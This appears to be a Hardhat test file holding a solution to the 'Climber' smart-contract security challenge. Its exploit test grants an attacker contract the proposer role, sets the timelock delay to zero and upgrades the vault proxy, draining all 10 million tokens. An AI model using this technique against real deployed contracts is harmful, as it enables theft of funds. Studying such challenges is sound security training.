const { ethers, upgrades } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Climber", function () {
  let deployer, proposer, sweeper, attacker;

  // Vault starts with 10 million tokens
  const VAULT_TOKEN_BALANCE = ethers.utils.parseEther("10000000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

    await ethers.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x16345785d8a0000", // 0.1 ETH
    ]);
    expect(await ethers.provider.getBalance(attacker.address)).to.equal(
      ethers.utils.parseEther("0.1")
    );

    // Deploy the vault behind a proxy using the UUPS pattern,
    // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
    this.vault = await upgrades.deployProxy(
      await ethers.getContractFactory("ClimberVault", deployer),
      [deployer.address, proposer.address, sweeper.address],
      { kind: "uups" }
    );

    expect(await this.vault.getSweeper()).to.eq(sweeper.address);
    expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt("0");
    expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
    expect(await this.vault.owner()).to.not.eq(deployer.address);

    // Instantiate timelock
    let timelockAddress = await this.vault.owner();
    this.timelock = await (
      await ethers.getContractFactory("ClimberTimelock", deployer)
    ).attach(timelockAddress);

    // Ensure timelock roles are correctly initialized
    expect(
      await this.timelock.hasRole(
        await this.timelock.PROPOSER_ROLE(),
        proposer.address
      )
    ).to.be.true;
    expect(
      await this.timelock.hasRole(
        await this.timelock.ADMIN_ROLE(),
        deployer.address
      )
    ).to.be.true;

    // Deploy token and transfer initial token balance to the vault
    this.token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
  });

  it("Exploit", async function () {
    const newClimberVault = await (
      await ethers.getContractFactory("NewClimberVault", attacker)
    ).deploy();

    const climberTimelockAttacker = await (
      await ethers.getContractFactory("ClimberTimelockAttacker", attacker)
    ).deploy(this.vault.address, this.timelock.address, this.token.address);

    const proposerRole = await this.timelock.PROPOSER_ROLE();
    const targets = [];
    const values = [];
    const dataElements = [];

    // 1 - Make timelock a proposer
    targets.push(this.timelock.address);
    values.push(0);
    dataElements.push(
      this.timelock.interface.encodeFunctionData("grantRole(bytes32,address)", [
        proposerRole,
        climberTimelockAttacker.address,
      ])
    );

    // 2 - Update delay to 0
    targets.push(this.timelock.address);
    values.push(0);
    dataElements.push(
      this.timelock.interface.encodeFunctionData("updateDelay(uint64)", [0])
    );

    // 3 - Upgrade the vault
    targets.push(this.vault.address);
    values.push(0);
    dataElements.push(
      this.vault.interface.encodeFunctionData("upgradeTo(address)", [
        newClimberVault.address,
      ])
    );

    // 4 - Create the proposal
    targets.push(climberTimelockAttacker.address);
    values.push(0);
    dataElements.push(
      climberTimelockAttacker.interface.encodeFunctionData("attack()")
    );

    const salt = ethers.utils.hexZeroPad("0x00", 32);

    let tx = await climberTimelockAttacker
      .connect(attacker)
      .setData(targets, values, dataElements, salt);

    tx = await this.timelock
      .connect(attacker)
      .execute(targets, values, dataElements, salt);
    await tx.wait();
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await this.token.balanceOf(this.vault.address)).to.eq("0");
    expect(await this.token.balanceOf(attacker.address)).to.eq(
      VAULT_TOKEN_BALANCE
    );
  });
});
